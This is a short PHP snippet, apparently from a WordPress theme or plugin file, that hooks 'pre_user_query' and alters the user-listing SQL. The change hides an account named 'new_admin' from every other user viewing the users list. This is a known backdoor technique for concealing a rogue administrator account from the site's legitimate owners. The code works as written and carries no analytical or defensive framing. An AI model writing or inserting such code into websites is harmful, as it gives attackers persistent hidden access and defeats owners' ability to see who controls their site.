add_action('pre_user_query', 'dt_pre_user_query');

function dt_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'new_admin') {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",
            $user_search->query_where
        );
    }
}
